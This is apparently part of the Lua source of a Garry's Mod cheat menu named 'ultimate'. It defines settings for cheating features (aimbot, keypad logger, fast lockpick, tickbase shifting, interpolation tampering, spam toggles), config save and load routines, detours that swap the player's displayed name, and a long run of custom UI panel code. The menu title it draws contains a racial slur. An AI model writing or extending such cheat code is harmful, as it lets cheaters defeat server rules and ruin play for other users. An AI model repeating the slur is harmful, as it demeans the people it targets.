ultimate.cfg.vars["Viewmodel y"] = 0
ultimate.cfg.vars["Viewmodel z"] = 0

ultimate.cfg.vars["Ghost follower"] = false
ultimate.cfg.vars["GFID"] = "SteamID"

// Misc

ultimate.cfg.vars["Use spam"] = false
ultimate.cfg.vars["Flashlight spam"] = false
ultimate.cfg.vars["Auto GTA"] = false
ultimate.cfg.vars["Camera spam"] = false
ultimate.cfg.vars["Fast lockpick"] = false
ultimate.cfg.vars["Keypad Logger"] = false


ultimate.cfg.vars["Config name"] = "new"
ultimate.cfg.vars["Selected config"] = 1

ultimate.cfg.colors["Menu color"] = "0 0 0 255"

ultimate.cfg.friends = {}
ultimate.cfg.priorityList = {}
ultimate.cfg.ents = {}


do
    local maxshift = GetConVar("sv_maxusrcmdprocessticks"):GetInt() - 1
    local tickrate = tostring(math.Round(1 / flTickInterval))

	RunConsoleCommand("cl_cmdrate", tickrate)
	RunConsoleCommand("cl_updaterate", tickrate)

	RunConsoleCommand("cl_interp", "0")
	RunConsoleCommand("cl_interp_ratio", "0")

    ultimate.cfg.vars["Shift ticks"] = maxshift
    ultimate.cfg.vars["Charge ticks"] = maxshift

    jopa.SetInterpolation( true )
    jopa.SetSequenceInterpolation( true )
    jopa.EnableAnimFix( false )
end




/*
    Miss / Hit logs
*/

ultimate.onScreenLogs = {}
ultimate.firedShots = 0
ultimate.HitLogsWhite = Color( 225, 225, 225 )
ultimate.MissReasons = {
    [ 1 ] =     { str = "spread", var = "Miss spread" },
    [ 2 ] =     { str = "occlusion", var = "Miss spread" },
    [ 3 ] =     { str = "desync", var = "Miss lagcomp" },
    [ 4 ] =     { str = "lagcomp", var = "Miss lagcomp" },
    [ 5 ] =     { str = "resolver", var = "Miss fail" },
}







// Config save / load

if not file.Exists( "data/ultimate", "GAME" ) then
    file.CreateDir("ultimate")
end

if not file.Exists( "ultimate/default.txt", "DATA" ) then
    file.Write( "ultimate/default.txt", util.TableToJSON( ultimate.cfg, false ) )
end

-- http.Fetch("https://media.discordapp.net/attachments/1108456125965279334/1111682362011562034/SPOILER_IMG_6794.png", function(body)
--     file.Write("prikol.png", body)
-- end)


ultimate.cfgTable = {}

function ultimate.fillConfigTable()
    local ftbl = file.Find("ultimate/*.txt", "DATA")
    ultimate.cfgTable = {}

    if not ftbl or #ftbl == 0 then return end

    for i = 1, #ftbl do
        local str = ftbl[i]
        local len = string.len(str)
        local f = string.sub(str, 1, len - 4) -- Remove .txt extension

        ultimate.cfgTable[#ultimate.cfgTable + 1] = f
    end
end

ultimate.fillConfigTable()

function ultimate.SaveConfig()
    local tojs = util.TableToJSON(ultimate.cfg, false)
    local str = ultimate.cfgTable[ultimate.cfg.vars["Selected config"]]

    if str then
        file.Write("ultimate/" .. str .. ".txt", tojs)
    else
        print("Error: Selected config not found.")
    end
end

function ultimate.LoadConfig()
    local str = ultimate.cfgTable[ultimate.cfg.vars["Selected config"]]
    //print(ultimate.cfg.vars["Selected config"])

    if not str or not file.Exists("ultimate/" .. str .. ".txt", "DATA") then
        print("Error: Config file not found.")
        return
    end

    local read = file.Read("ultimate/" .. str .. ".txt", "DATA")
    local totbl = util.JSONToTable(read)
    if not totbl then
        print("Error: Failed to parse config file.")
        return
    end

    local ConfigName = ultimate.cfg.vars["Config name"]
    local SelectedConfig = ultimate.cfg.vars["Selected config"]

    for k, v in pairs(totbl) do
        for key, value in pairs(v) do
            local tbl = ultimate.cfg

            if k == "vars" then
                tbl = ultimate.cfg.vars
            elseif k == "colors" then
                tbl = ultimate.cfg.colors
            elseif k == "binds" then
                tbl = ultimate.cfg.binds
            elseif k == "binds" then
                tbl = ultimate.cfg.binds
            elseif k == "friends" then
                tbl = ultimate.cfg.friends
            elseif k == "ents" then
                tbl = ultimate.cfg.ents
            end

            tbl[key] = value
        end
    end

    ultimate.cfg.vars["Config name"] = ConfigName
    ultimate.cfg.vars["Selected config"] = SelectedConfig

    jopa.SetInterpolation(ultimate.cfg.vars["Disable interpolation"])
    jopa.SetSequenceInterpolation(ultimate.cfg.vars["Disable Sequence interpolation"])
    jopa.EnableAnimFix(ultimate.cfg.vars["Update Client Anim fix"])
    jopa.EnableBoneFix(ultimate.cfg.vars["Bone fix"])

    jopa.SetMaxShift(ultimate.cfg.vars["Charge ticks"])
    jopa.SetMinShift(ultimate.cfg.vars["Shift ticks"])
    jopa.EnableTickbaseShifting(ultimate.cfg.vars["Tickbase shift"])
end

function ultimate.CreateConfig()
    local str = ultimate.cfg.vars["Config name"]

    if str then
        file.Write("ultimate/" .. str .. ".txt", "")
        ultimate.fillConfigTable()
        ultimate.initTab("Config")
    else
        print("Error: Config name not specified.")
    end
end

function ultimate.DeleteConfig()
    local selectedConfigId = ultimate.cfg.vars["Selected config"]
    local str = ultimate.cfgTable[selectedConfigId]

    if str then
        file.Delete("ultimate/" .. str .. ".txt")

        table.remove(ultimate.cfgTable, selectedConfigId)

        if #ultimate.cfgTable > 0 then
            ultimate.cfg.vars["Selected config"] = 1
        else
            ultimate.cfg.vars["Selected config"] = nil
        end

        ultimate.fillConfigTable()
        ultimate.initTab("Config")
    else
        print("Error: Selected config not found.")
    end
end


function ultimate.TIME_TO_TICKS(time)
	return math.floor(0.5 + time / flTickInterval)
end

function ultimate.TICKS_TO_TIME(ticks)
    return flTickInterval * ticks
end

function ultimate.ROUND_TO_TICK(time)
    return ultimate.TICKS_TO_TIME(ultimate.TIME_TO_TICKS(time))
end

local Utility = {}

function Utility.TimeToTicks( flTime )
    return math.floor( 0.5 + flTime / flTickInterval )
end

/*
    Materials
*/

ultimate.chamsMaterials = {
    "Flat",
    "Wireframe",
    "Selfillum",
    "Selfillum additive",
    "Metallic",
    "Glass",
    "Glowing glass"
}


/*
    Detours
*/

do
    local PLAYER = FindMetaTable( "Player" )

    local Name_     = PLAYER.Name
    local Nick_     = PLAYER.Nick
    local GetName_  = PLAYER.GetName

    function PLAYER:Name()

        if ultimate.cfg.vars["Hide name"] and self == pLocalPlayer then
            return ultimate.cfg.vars["Custom name"]
        end

        return Name_( self )
    end

    function PLAYER:Nick()

        if ultimate.cfg.vars["Hide name"] and self == pLocalPlayer then
            return ultimate.cfg.vars["Custom name"]
        end

        return Nick_( self )
    end

    function PLAYER:GetName()

        if ultimate.cfg.vars["Hide name"] and self == pLocalPlayer then
            return ultimate.cfg.vars["Custom name"]
        end

        return GetName_( self )
    end
end



ultimate.ui = {}

ultimate.validsnd = false

/*
sound.PlayURL ( "https://cdn.discordapp.com/attachments/981977924087472128/1116820124985458770/ya_resskiy.mp3", "noblock", function( s )
    if not IsValid( s ) then return end
    ultimate.validsnd = s

    ultimate.validsnd:EnableLooping( true )
end )
*/


ultimate.activetab = "Aimbot"
ultimate.multicombo = false


ultimate.hint = false
ultimate.hintText = ""
ultimate.hintX = 0
ultimate.hintY = 0

do
    StoredCursorPos = {}

    function RememberCursorPosition()

        local x, y = input.GetCursorPos()

        if ( x == 0 && y == 0 ) then return end

        StoredCursorPos.x, StoredCursorPos.y = x, y

    end

    function RestoreCursorPosition()

        if ( !StoredCursorPos.x || !StoredCursorPos.y ) then return end
        input.SetCursorPos( StoredCursorPos.x, StoredCursorPos.y )

    end
end

do
    local PANEL = {}

    PANEL.FadeTime = 0

    function PANEL:Init()
        self:SetFocusTopLevel( true )
        self:SetSize( 800, 650 )

        self:SetPaintBackgroundEnabled( false )
        self:SetPaintBorderEnabled( false )
        self:DockPadding( 5, 60, 5, 5 )
        self:MakePopup()
        self:Center( true )

        PANEL.TopPanel = self:Add( "DPanel" )
        PANEL.TopPanel:SetPos( 5, 30 )
        PANEL.TopPanel:SetSize( 790, 25 )

        function PANEL.TopPanel:Paint( w, h )
            surface.SetDrawColor( ultimate.Colors[ 54 ] )
            surface.DrawRect( 0, 24, w, 1 )
        end
    end

    function PANEL:Think()
        local x,y = input.GetCursorPos()
        local mousex = math.Clamp( x, 1, screenWidth - 1 )
        local mousey = math.Clamp( y, 1, screenHeight - 1 )

        if ( self.Dragging ) then

            local x = mousex - self.Dragging[1]
            local y = mousey - self.Dragging[2]

            self:SetPos( x, y )

        end

        self:SetCursor( "arrow" )
    end

    function PANEL:IsActive()

        if ( self:HasFocus() ) then return true end
        if ( vgui.FocusedHasParent( self ) ) then return true end

        return false

    end


    function PANEL:OnMousePressed()
        local x,y = input.GetCursorPos()
        local screenX, screenY = self:LocalToScreen( 0, 0 )

        if (  y < ( screenY + 850 ) ) then
            self.Dragging = { x - self.x, y - self.y }
            self:MouseCapture( true )
            return
        end

    end

    function PANEL:OnMouseReleased()

        self.Dragging = nil
        self.Sizing = nil
        self:MouseCapture( false )

    end

    function PANEL:Paint( w, h )
        surface.SetDrawColor( ultimate.Colors[ 25 ] )
        surface.DrawRect( 0, 24, w, h )

        surface.SetDrawColor( ultimate.Colors[ 54 ] )
        surface.DrawRect( 0, 0, w, 25 )

        surface.SetFont( "DermaSmall" )
        surface.SetTextColor( ultimate.Colors[ 165 ] )
        surface.SetTextPos( 8, 4 )
        surface.DrawText( "NIGGAHACK v2" )
    end

    function PANEL:GetTopPanel()
        return PANEL.TopPanel
    end

    vgui.Register( "UFrame", PANEL, "EditablePanel" )
end

do
    local PANEL = {}

    function PANEL:Init()
        self:Dock( FILL )

        local vbar = self.VBar
        vbar:SetWide(3)

        vbar.Paint = nil
        vbar.btnUp.Paint = nil
        vbar.btnDown.Paint = nil

        function vbar.btnGrip:Paint( w, h )
            surface.SetDrawColor( ultimate.Colors[ 54 ] )
            surface.DrawRect( 0, 0, w, h )
        end
    end

    function PANEL:Paint( w, h )
    end

    function PANEL:OnMousePressed()
        ultimate.frame:OnMousePressed()
    end

    function PANEL:OnMouseReleased()
        ultimate.frame:OnMouseReleased()
    end

    vgui.Register( "UScroll", PANEL, "DScrollPanel" )
end

do
    local PANEL = {}

    function PANEL:Init()
        self.ItemPanel = vgui.Create( "DPanel", self )
        self.ItemPanel:Dock( FILL )
        self.ItemPanel:DockMargin( 3, 23, 3, 3 )

        self.ItemPanel.Paint = nil

        function self.ItemPanel:OnMousePressed()
            ultimate.frame:OnMousePressed()
        end

        function self.ItemPanel:OnMouseReleased()
            ultimate.frame:OnMouseReleased()
        end
    end

    function PANEL:Paint( w, h )
        surface.SetDrawColor( ultimate.Colors[ 54 ] )
        surface.DrawOutlinedRect( 0, 0, w, h, 1 )

        surface.SetFont( "DermaSmall" )

        surface.SetTextColor( ultimate.Colors[ 255 ] )
        surface.SetTextPos( 8, 2 )
        surface.DrawText( self.txt )

        surface.SetDrawColor( ultimate.Colors[ 54 ] )
        surface.DrawRect( 6, 20, w - 12, 1 )
    end

    function PANEL:OnMousePressed()
        ultimate.frame:OnMousePressed()
    end

    function PANEL:OnMouseReleased()
        ultimate.frame:OnMouseReleased()
    end

    function PANEL:GetItemPanel()
        return self.ItemPanel
    end

    vgui.Register( "UPanel", PANEL, "Panel" )
end

do
    local PANEL = {}

    function PANEL:Paint( w, h )
        surface.SetDrawColor( ultimate.Colors[ 54 ] )
        surface.DrawRect( 0, 0, w, h )
    end

    vgui.Register( "UPaintedPanel", PANEL, "Panel" )
end

do
    local PANEL = {}

    function PANEL:Init()
        self:Dock( TOP )
        self:DockMargin( 4, 4, 4, 0 )
        self:SetTall( 18 )
    end

    function PANEL:Paint( w, h )

    end

    vgui.Register( "UCBPanel", PANEL, "DPanel" )
end

do
    local PANEL = {}

    function PANEL:Init()
        self.Label:SetFont("DermaSmall")
        self.Label:SetTextColor(ultimate.Colors[255])

        self.Button:SetSize( 18, 18 )

        function self.Button:Paint(w,h)
            local v = self:GetChecked()

            surface.SetDrawColor(ultimate.Colors[54])

            surface.DrawOutlinedRect(0,0,w,h,1)

            if !v and !self:IsHovered() then return end

            if v then
                surface.SetDrawColor(ultimate.Colors[54])
            else
                surface.SetDrawColor(ultimate.Colors[40])
            end

            surface.DrawRect(3,3,w-6,h-6)
        end
    end

    function PANEL:PerformLayout()

        local x = self.m_iIndent || 0

        self.Button:SetSize( 18, 18 )
        self.Button:SetPos( x, math.floor( ( self:GetTall() - self.Button:GetTall() ) / 2 ) )

        self.Label:SizeToContents()
        self.Label:SetPos( x + self.Button:GetWide() + 9, math.floor( ( self:GetTall() - self.Label:GetTall() ) / 2 ) )

    end

    vgui.Register( "UCheckboxLabel", PANEL, "DCheckBoxLabel" )
end

do
    local PANEL = {}
    AccessorFunc(PANEL, "Value", "Value")
    AccessorFunc(PANEL, "SlideX", "SlideX")
    AccessorFunc(PANEL, "Min", "Min")
    AccessorFunc(PANEL, "Decimals", "Decimals")
    AccessorFunc(PANEL, "Max", "Max")
    AccessorFunc(PANEL, "Dragging", "Dragging")

    function PANEL:Init()
        self:SetMouseInputEnabled(true)

        self.Min = 0
        self.Max = 1
        self.SlideX = 0
        self.Decimals = 0

        self:SetValue(self.Min)
        self:SetSlideX(0)

        self:SetTall(15)
    end

    function PANEL:OnCursorMoved(x, y)
        if !self.Dragging then return end

        local w, h = self:GetSize()

        x = math.Clamp(x, 0, w) / w
        y = math.Clamp(y, 0, h) / h

        local value = self.Min + (self.Max - self.Min) * x
        value = math.Round(value, self:GetDecimals())

        self:SetValue(value)
        self:SetSlideX(x)

        self:OnValueChanged(value)

        self:InvalidateLayout()
    end

    function PANEL:OnMousePressed(mcode)
        self:SetDragging(true)
        self:MouseCapture(true)

        local x, y = self:CursorPos()
        self:OnCursorMoved(x, y)
    end

    function PANEL:OnMouseReleased(mcode)
        self:SetDragging(false)
        self:MouseCapture(false)
    end

    function PANEL:OnValueChanged(value)

    end

    function PANEL:Paint(w,h)
        local min, max = self:GetMin(), self:GetMax()

        surface.SetDrawColor(ultimate.Colors[54])
        surface.DrawOutlinedRect(0,0,w,h,1)

        surface.SetDrawColor(ultimate.Colors[54])
        surface.DrawRect(2, 2, self:GetSlideX()*w-4, h-4)
    end

    vgui.Register("USlider", PANEL, "Panel")
end

do
    local PANEL = {}

    function PANEL:Init()
        self:Dock(TOP)
        self:DockMargin(4,4,4,0)

        self:SetTextColor(ultimate.Colors[165])
        self:SetFont("DermaSmall")
    end

    function PANEL:Paint(w,h)
        if self:IsHovered() then
            surface.SetDrawColor(ultimate.Colors[255])
            surface.DrawRect(0, 0, w, h)
        end

        surface.SetDrawColor(ultimate.Colors[54])
        surface.DrawOutlinedRect(0,0,w,h,1)
    end

    vgui.Register( "UButton", PANEL, "DButton" )
end

do
    local PANEL = {}

    function PANEL:Init()
        self:Dock(TOP)
        self:DockMargin(1,1,1,0)

        self:SetTextColor(ultimate.Colors[245])
        self:SetFont("DermaSmall")
    end

    function PANEL:Paint(w,h)
        if self:IsHovered() then
            surface.SetDrawColor(ultimate.Colors[35])
            surface.DrawRect(0, 0, w, h)
        end
    end

    vgui.Register( "UESPPButton", PANEL, "DButton" ) -- KNOPKI
end

do
    local PANEL = {}

    function PANEL:Init()
        self:SetTall(20)
        self.DropButton.Paint = nil
    end

    function PANEL:Paint(w,h)
        surface.SetDrawColor(ultimate.Colors[25]) -- COBLOX BOX COLOR
        surface.DrawRect(0,0,w,h)

        surface.SetDrawColor(ultimate.Colors[32])
        surface.DrawRect(w-25,0,25,25)

        surface.SetTextColor(ultimate.Colors[255])
        surface.SetTextPos(w-20,20/2-15/2)
        surface.SetFont("DermaSmall")
        surface.DrawText("▼")

        surface.SetDrawColor(ultimate.Colors[54])
        surface.DrawOutlinedRect(0,0,w,h)
    end

    function PANEL:OpenMenu( pControlOpener )

        if ( pControlOpener && pControlOpener == self.TextEntry ) then
            return
        end

        -- Don't do anything if there aren't any options..
        if ( #self.Choices == 0 ) then return end

        -- If the menu still exists and hasn't been deleted
        -- then just close it and don't open a new one.
        if ( IsValid( self.Menu ) ) then
            self.Menu:Remove()
            self.Menu = nil
        end

        -- If we have a modal parent at some level, we gotta parent to that or our menu items are not gonna be selectable
        local parent = self
        while ( IsValid( parent ) && !parent:IsModal() ) do
            parent = parent:GetParent()
        end
        if ( !IsValid( parent ) ) then parent = self end

        self.Menu = DermaMenu( false, parent )

        function self.Menu:Paint(w,h)
            surface.SetDrawColor(ultimate.Colors[25])
            surface.DrawRect(0,0,w,h)
            surface.SetDrawColor(ultimate.Colors[54])
            surface.DrawOutlinedRect(0,-1,w,h+1)
        end

        for k, v in pairs( self.Choices ) do
            local option = self.Menu:AddOption( v, function() self:ChooseOption( v, k ) end )
            option.txt = option:GetText()
            option:SetText("")

            function option:Paint(w,h)
                if self:IsHovered() then
                    surface.SetDrawColor( ultimate.Colors[ 40 ] )
                    surface.DrawRect( 1, 1, w - 2, h - 2 )
                end

                surface.SetTextColor( ultimate.Colors[ 255 ] )
                surface.SetTextPos( 10, 4 )
                surface.DrawText( option.txt )
            end

            if ( self.Spacers[ k ] ) then
                self.Menu:AddSpacer()
            end
        end


        local x, y = self:LocalToScreen( 0, self:GetTall() )

        self.Menu:SetMinimumWidth( self:GetWide() )
        self.Menu:Open( x, y, false, self )

    end

    function PANEL:PerformLayout(s)
        self:SetTextColor(ultimate.Colors[255])
        self:SetFont("DermaSmall")
    end

    vgui.Register( "UComboBox", PANEL, "DComboBox" )
end




do
    local PANEL = {}

    AccessorFunc( PANEL, "m_iSelectedNumber", "SelectedNumber" )

    function PANEL:Init()

        self:SetSelectedNumber( 0 )
        self:Dock( RIGHT )
        self:DockMargin( 4, 0, 0, 0 )
        self:SetTall( 18 )
        self:SetWide( 75 )

    end

    function PANEL:UpdateText()

        local str = input.GetKeyName( self:GetSelectedNumber() )
        if ( !str ) then str = "" end

        str = language.GetPhrase( str )

        self:SetText( "["..str.."]" )
        self:SetTextColor(ultimate.Colors[165]) -- BINDS
        self:SetFont("DermaSmall")
    end

    function PANEL:Paint(w,h)
        surface.SetDrawColor(ultimate.Colors[54])
        surface.DrawOutlinedRect(0,0,w,h,1)
    end

    function PANEL:DoClick()

        self:SetText( "PRESS A KEY" )
        input.StartKeyTrapping()
        self.Trapping = true

    end

    function PANEL:DoRightClick()

        self:SetText( "[]" )
        self:SetValue( 0 )

    end

    function PANEL:SetSelectedNumber( iNum )

        self.m_iSelectedNumber = iNum
        self:UpdateText()
        self:OnChange( iNum )

    end

    function PANEL:Think()

        if ( input.IsKeyTrapping() && self.Trapping ) then

            local code = input.CheckKeyTrapping()
            if ( code ) then

                if ( code == KEY_ESCAPE ) then

                    self:SetValue( self:GetSelectedNumber() )

                else

                    self:SetValue( code )

                end

                self.Trapping = false

            end

        end

    end

    function PANEL:SetValue( iNumValue )

        self:SetSelectedNumber( iNumValue )

    end

    function PANEL:GetValue()

        return self:GetSelectedNumber()

    end

    function PANEL:OnChange()
    end

    vgui.Register( "UBinder", PANEL, "DButton" )
end

do
    local PANEL = {}

    PANEL.Color = Color(255,255,255,255)

    function PANEL:Init()
        self:Dock( RIGHT )
        self:DockMargin( 4, 0, 0, 0 )
        self:SetTall(18)
        self:SetWide(18)

        self:SetText("")
    end

    function PANEL:Paint(w,h)
        if self.Color.a < 255 then
            surface.SetDrawColor( ultimate.Colors[255] )
            surface.SetMaterial( ultimate.Materials["Alpha grid"] )
            surface.DrawTexturedRect( 0, 0, w, h )
        end

        surface.SetDrawColor(self.Color)
        surface.DrawRect(0,0,w,h)
    end

    vgui.Register( "UCPicker", PANEL, "DButton" )
end

do
    local PANEL = {}

    PANEL.lifeTime = 0

    function PANEL:Paint( w, h )
        surface.SetDrawColor( ultimate.Colors[ 25 ] )
        surface.DrawRect( 0, 0, w, h )

        surface.SetDrawColor( ultimate.Colors[54] )
        surface.DrawOutlinedRect( 0, 0, w, h, 1 )
    end

    function PANEL:Init()
        self:RequestFocus()
        self:MakePopup()
    end

    function PANEL:Think()
        if self.lifeTime < 15 then self.lifeTime = self.lifeTime + 1 end

        if not self:HasFocus() and self.lifeTime >= 14 then
            self:Remove()
        end
    end

    vgui.Register( "ULifeTimeBase", PANEL, "EditablePanel" )
end

do
    local PANEL = {}

    function PANEL:Init()
        self:SetSize(200,200)
    end

    function PANEL:Paint( w, h )
        surface.SetDrawColor( ultimate.Colors[ 25 ] )
        surface.DrawRect( 0, 0, w, h )

        surface.SetDrawColor( ultimate.Colors[54] )
        surface.DrawOutlinedRect( 0, 0, w, h, 1 )
    end

    vgui.Register( "UColorPanel", PANEL, "ULifeTimeBase" )
end

do
    local PANEL = {}

    function PANEL:Init()
        self:Dock( FILL )
        self:DockPadding(5, 5, 5, 5)
        self:SetPalette( false )
        self:SetWangs( false )
    end

    vgui.Register( "UColorMixer", PANEL, "DColorMixer" )
end

do
    local PANEL = {}

    AccessorFunc( PANEL, "m_bDirty", "Dirty", FORCE_BOOL )
    AccessorFunc( PANEL, "m_bSortable", "Sortable", FORCE_BOOL )

    AccessorFunc( PANEL, "m_iHeaderHeight", "HeaderHeight" )
    AccessorFunc( PANEL, "m_iDataHeight", "DataHeight" )

    AccessorFunc( PANEL, "m_bMultiSelect", "MultiSelect" )
    AccessorFunc( PANEL, "m_bHideHeaders", "HideHeaders" )

    function PANEL:Init()
        self:SetSortable( true )
        self:SetMouseInputEnabled( true )
        self:SetMultiSelect( true )
        self:SetHideHeaders( false )

        self:SetPaintBackground( true )
        self:SetHeaderHeight( 16 )
        self:SetDataHeight( 17 )

        self.Columns = {}

        self.Lines = {}
        self.Sorted = {}

        self:SetDirty( true )

        self.pnlCanvas = vgui.Create( "Panel", self )

        self.VBar = vgui.Create( "DVScrollBar", self )
        self.VBar:SetZPos( 20 )
    end

    function PANEL:DisableScrollbar()

        if ( IsValid( self.VBar ) ) then
            self.VBar:Remove()
        end

        self.VBar = nil

    end

    function PANEL:GetLines()
        return self.Lines
    end

    function PANEL:GetInnerTall()
        return self:GetCanvas():GetTall()
    end

    function PANEL:GetCanvas()
        return self.pnlCanvas
    end

    function PANEL:AddColumn( strName, iPosition )

        if ( iPosition ) then
            if ( iPosition <= 0 ) then
                ErrorNoHaltWithStack( "Attempted to insert column at invalid position ", iPosition )
                return
            end

            if ( IsValid( self.Columns[ iPosition ] ) ) then
                ErrorNoHaltWithStack( "Attempted to insert duplicate column." )
                return
            end
        end

        local pColumn = nil

        if ( self.m_bSortable ) then
            pColumn = vgui.Create( "DListView_Column", self )
        else
            pColumn = vgui.Create( "DListView_ColumnPlain", self )
        end

        pColumn:SetName( strName )
        pColumn:SetZPos( 10 )

        if ( iPosition ) then

            table.insert( self.Columns, iPosition, pColumn )

            local i = 1
            for id, pnl in pairs( self.Columns ) do
                pnl:SetColumnID( i )
                i = i + 1
            end

        else

            local ID = table.insert( self.Columns, pColumn )
            pColumn:SetColumnID( ID )

        end

        self:InvalidateLayout()

        return pColumn

    end

    function PANEL:RemoveLine( LineID )

        local Line = self:GetLine( LineID )
        local SelectedID = self:GetSortedID( LineID )

        self.Lines[ LineID ] = nil
        table.remove( self.Sorted, SelectedID )

        self:SetDirty( true )
        self:InvalidateLayout()

        Line:Remove()

    end

    function PANEL:ColumnWidth( i )

        local ctrl = self.Columns[ i ]
        if ( !ctrl ) then return 0 end

        return ctrl:GetWide()

    end

    function PANEL:FixColumnsLayout()

        local NumColumns = table.Count( self.Columns )
        if ( NumColumns == 0 ) then return end

        local AllWidth = 0
        for k, Column in pairs( self.Columns ) do
            AllWidth = AllWidth + math.ceil( Column:GetWide() )
        end

        local ChangeRequired = self.pnlCanvas:GetWide() - AllWidth
        local ChangePerColumn = math.floor( ChangeRequired / NumColumns )
        local Remainder = ChangeRequired - ( ChangePerColumn * NumColumns )

        for k, Column in pairs( self.Columns ) do

            local TargetWidth = math.ceil( Column:GetWide() ) + ChangePerColumn
            Remainder = Remainder + ( TargetWidth - Column:SetWidth( TargetWidth ) )

        end

        local TotalMaxWidth = 0

        -- If there's a remainder, try to palm it off on the other panels, equally
        while ( Remainder != 0 ) do

            local PerPanel = math.floor( Remainder / NumColumns )

            for k, Column in pairs( self.Columns ) do

                Remainder = math.Approach( Remainder, 0, PerPanel )

                local TargetWidth = math.ceil( Column:GetWide() ) + PerPanel
                Remainder = Remainder + ( TargetWidth - Column:SetWidth( TargetWidth ) )

                if ( Remainder == 0 ) then break end

                TotalMaxWidth = TotalMaxWidth + math.ceil( Column:GetMaxWidth() )

            end

            -- Total max width of all the columns is less than the width of the DListView, abort!
            if ( TotalMaxWidth < self.pnlCanvas:GetWide() ) then break end

            Remainder = math.Approach( Remainder, 0, 1 )

        end

        -- Set the positions of the resized columns
        local x = 0
        for k, Column in pairs( self.Columns ) do

            Column.x = x
            x = x + math.ceil( Column:GetWide() )

            Column:SetTall( math.ceil( self:GetHeaderHeight() ) )
            Column:SetVisible( !self:GetHideHeaders() )

        end

    end

    function PANEL:PerformLayout()

        -- Do Scrollbar
        local Wide = self:GetWide()
        local YPos = 0

        if ( IsValid( self.VBar ) ) then

            self.VBar:SetPos( self:GetWide() - 16, 0 )
            self.VBar:SetSize( 16, self:GetTall() )
            self.VBar:SetUp( self.VBar:GetTall() - self:GetHeaderHeight(), self.pnlCanvas:GetTall() )
            YPos = self.VBar:GetOffset()

            if ( self.VBar.Enabled ) then Wide = Wide - 16 end

        end

        if ( self.m_bHideHeaders ) then
            self.pnlCanvas:SetPos( 0, YPos )
        else
            self.pnlCanvas:SetPos( 0, YPos + self:GetHeaderHeight() )
        end

        self.pnlCanvas:SetSize( Wide, self.pnlCanvas:GetTall() )

        self:FixColumnsLayout()

        --
        -- If the data is dirty, re-layout
        --
        if ( self:GetDirty() ) then

            self:SetDirty( false )
            local y = self:DataLayout()
            self.pnlCanvas:SetTall( y )

            -- Layout again, since stuff has changed..
            self:InvalidateLayout( true )

        end

    end

    function PANEL:OnScrollbarAppear()

        self:SetDirty( true )
        self:InvalidateLayout()

    end

    function PANEL:OnRequestResize( SizingColumn, iSize )

        -- Find the column to the right of this one
        local Passed = false
        local RightColumn = nil
        for k, Column in pairs( self.Columns ) do

            if ( Passed ) then
                RightColumn = Column
                break
            end

            if ( SizingColumn == Column ) then Passed = true end

        end

        -- Alter the size of the column on the right too, slightly
        if ( RightColumn ) then

            local SizeChange = SizingColumn:GetWide() - iSize
            RightColumn:SetWide( RightColumn:GetWide() + SizeChange )

        end

        SizingColumn:SetWide( iSize )
        self:SetDirty( true )

        -- Invalidating will munge all the columns about and make it right
        self:InvalidateLayout()

    end

    function PANEL:DataLayout()

        local y = 0
        local h = self.m_iDataHeight

        local alt = false
        for k, Line in ipairs( self.Sorted ) do

            if ( !Line:IsVisible() ) then continue end

            Line:SetPos( 1, y )
            Line:SetSize( self:GetWide() - 2, h )
            Line:DataLayout( self )

            Line:SetAltLine( alt )
            alt = !alt

            y = y + Line:GetTall()

        end

        return y

    end

    PANEL.Cur = true
    function PANEL:AddLine( ... )

        self.Cur = not self.Cur

        self:SetDirty( true )
        self:InvalidateLayout()

        local Line = vgui.Create( "DListView_Line", self.pnlCanvas )
        local c = self.Cur and 48 or 32

        function Line:Paint( w, h )

            surface.SetDrawColor( c, c, c )
            surface.DrawRect( 0, 0, w, h )
        end

        local ID = table.insert( self.Lines, Line )

        Line:SetListView( self )
        Line:SetID( ID )

        -- This assures that there will be an entry for every column
        for k, v in pairs( self.Columns ) do
            Line:SetColumnText( k, "" )
        end

        for k, v in pairs( {...} ) do
            Line:SetColumnText( k, v )
        end

        -- Make appear at the bottom of the sorted list
        local SortID = table.insert( self.Sorted, Line )

        if ( SortID % 2 == 1 ) then
            Line:SetAltLine( true )
        end

        return Line

    end

    function PANEL:OnMouseWheeled( dlta )

        if ( !IsValid( self.VBar ) ) then return end

        return self.VBar:OnMouseWheeled( dlta )

    end

    function PANEL:ClearSelection( dlta )

        for k, Line in pairs( self.Lines ) do
            Line:SetSelected( false )
        end

    end

    function PANEL:GetSelectedLine()

        for k, Line in pairs( self.Lines ) do
            if ( Line:IsSelected() ) then return k, Line end
        end

    end

    function PANEL:GetLine( id )

        return self.Lines[ id ]

    end

    function PANEL:GetSortedID( line )

        for k, v in pairs( self.Sorted ) do

            if ( v:GetID() == line ) then return k end

        end

    end

    function PANEL:OnClickLine( Line, bClear )

        local bMultiSelect = self:GetMultiSelect()
        if ( !bMultiSelect && !bClear ) then return end


        if ( bMultiSelect && input.IsKeyDown( KEY_LCONTROL ) ) then
            bClear = false
        end


        if ( bMultiSelect && input.IsKeyDown( KEY_LSHIFT ) ) then

            local Selected = self:GetSortedID( self:GetSelectedLine() )
            if ( Selected ) then

                local LineID = self:GetSortedID( Line:GetID() )

                local First = math.min( Selected, LineID )
                local Last = math.max( Selected, LineID )


                for id = First, Last do
                    local line = self.Sorted[ id ]
                    if ( !line:IsLineSelected() ) then self:OnRowSelected( line:GetID(), line ) end
                    line:SetSelected( true )
                end


                if ( bClear ) then self:ClearSelection() end

                for id = First, Last do
                    local line = self.Sorted[ id ]
                    line:SetSelected( true )
                end

                return

            end

        end

        --
        -- Check for double click
        --
        if ( Line:IsSelected() && Line.m_fClickTime && ( !bMultiSelect || bClear ) ) then

            local fTimeDistance = SysTime() - Line.m_fClickTime

            if ( fTimeDistance < 0.3 ) then
                self:DoDoubleClick( Line:GetID(), Line )
                return
            end

        end


        if ( !bMultiSelect || bClear ) then
            self:ClearSelection()
        end

        if ( Line:IsSelected() ) then return end

        Line:SetSelected( true )
        Line.m_fClickTime = SysTime()

        self:OnRowSelected( Line:GetID(), Line )

    end

    function PANEL:SortByColumns( c1, d1, c2, d2, c3, d3, c4, d4 )

        table.Copy( self.Sorted, self.Lines )

        table.sort( self.Sorted, function( a, b )

            if ( !IsValid( a ) ) then return true end
            if ( !IsValid( b ) ) then return false end

            if ( c1 && a:GetColumnText( c1 ) != b:GetColumnText( c1 ) ) then
                if ( d1 ) then a, b = b, a end
                return a:GetColumnText( c1 ) < b:GetColumnText( c1 )
            end

            if ( c2 && a:GetColumnText( c2 ) != b:GetColumnText( c2 ) ) then
                if ( d2 ) then a, b = b, a end
